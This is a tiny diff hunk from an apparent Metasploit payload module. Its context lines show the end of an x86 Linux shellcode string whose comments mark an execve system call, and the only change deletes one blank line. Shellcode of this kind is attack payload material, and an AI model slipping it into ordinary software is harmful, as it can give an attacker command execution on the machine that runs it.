@@ -79,5 +79,4 @@ module MetasploitModule
     "\xb0\x0b"             +#   mov al,0xb (execve)
     "\xcd\x80"              #   int 0x80
   end
-
 end
